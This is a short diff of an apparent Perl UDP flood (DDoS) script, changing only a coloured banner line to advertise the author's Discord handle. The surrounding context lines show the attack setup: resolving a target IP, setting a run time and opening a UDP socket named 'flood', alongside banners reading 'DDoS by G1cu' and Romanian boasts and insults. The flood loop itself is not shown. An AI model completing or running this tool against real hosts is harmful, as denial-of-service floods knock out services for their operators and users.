@@ -49,7 +49,7 @@ $iaddr = inet_aton("$ip") or die "Hai ca e ip asta daca e.. ce prost esti.. $ip\
 $endtime = time() + ($time ? $time : 1000000);
 socket(flood, PF_INET, SOCK_DGRAM, 17);
 
-printf "[0;32m>>\n";
+printf "[0;35m>>Discord G1cu#1122\n";
 printf "[0;32m>> G1cu va da valoare saracilor \n";
 printf "[0;31m>> DDoS by G1cu   \n";
 printf "[0;33m>> Asta inseamna Valoare   \n";
